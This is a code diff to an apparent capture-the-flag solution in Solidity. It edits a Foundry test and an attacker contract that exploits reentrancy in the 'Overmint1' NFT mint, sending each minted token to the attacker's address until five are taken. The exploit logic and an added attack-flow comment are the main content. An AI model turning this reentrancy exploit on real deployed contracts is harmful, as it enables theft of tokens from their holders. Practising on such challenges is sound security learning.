@@ -21,18 +21,24 @@ contract Overmint1Attacker is Test {
         console.log("address(attacker)", address(attacker));
         console.log("Overmint1Attacker", address(attackerContract));
         console.log("victim", address(victim));
-        vm.startPrank(attacker);
 
+        vm.startPrank(attacker);
         // attacking....
         attackerContract.callVictimsMint(address(victim));
         vm.stopPrank();
 
+        assertEq(victim.success(attacker), true);
         console.log(victim.balanceOf(attacker));
-
-        require(victim.success(attacker));
     }
 }
 
+/**
+ * @dev
+ * Attack procession:
+ *  Attacker => AttackerContract => Overmint1 mint
+ *                                                  AttackerContract received NFT => transfer NFT from  AttackerContract to Attacker
+ *                                                                                                                                      => mint again
+ */
 contract AttackerContract is IERC721Receiver {
     address attackerAddress;
 
@@ -45,10 +51,8 @@ contract AttackerContract is IERC721Receiver {
         external
         returns (bytes4)
     {
-        // msg.sender == victim
-        console.log("from,msg.sender,attackerAddress", from, msg.sender, attackerAddress);
+        // console.log("from,msg.sender,attackerAddress", from, msg.sender, attackerAddress);
 
-        // confirm the msg.sender
         if (Overmint1(msg.sender).balanceOf(attackerAddress) < 5) {
             // each time received the nft, directly send to the attacker
             Overmint1(msg.sender).safeTransferFrom(address(this), attackerAddress, tokenId);
